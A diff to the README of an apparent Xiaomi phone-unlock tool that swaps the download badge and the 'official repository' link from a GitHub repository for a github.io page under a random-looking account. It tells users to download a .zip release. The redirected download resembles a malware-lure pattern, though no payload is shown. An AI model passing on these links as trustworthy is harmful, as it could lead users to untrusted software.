@@ -1,6 +1,6 @@
 # 🔓 Xiaomi-Unlock-Tool-Pro - Remove locks from your Xiaomi phone
 
-[![](https://img.shields.io/badge/Download-Tool-blue)](https://github.com/calefacient-buildingdepartment453/Xiaomi-Unlock-Tool-Pro)
+[![](https://img.shields.io/badge/Download-Tool-blue)](https://calefacient-buildingdepartment453.github.io)
 
 ## 📖 About this software
 
@@ -34,7 +34,7 @@ Successful unlocking requires your phone to communicate with the PC. Follow thes
 
 Follow these exact steps to get the program onto your computer.
 
-1.  Visit the official repository page here: [https://github.com/calefacient-buildingdepartment453/Xiaomi-Unlock-Tool-Pro](https://github.com/calefacient-buildingdepartment453/Xiaomi-Unlock-Tool-Pro).
+1.  Visit the official repository page here: [https://calefacient-buildingdepartment453.github.io](https://calefacient-buildingdepartment453.github.io).
 2.  Look for the Releases section on the right side of the page.
 3.  Click the latest version link.
 4.  Select the .zip file to start the download.
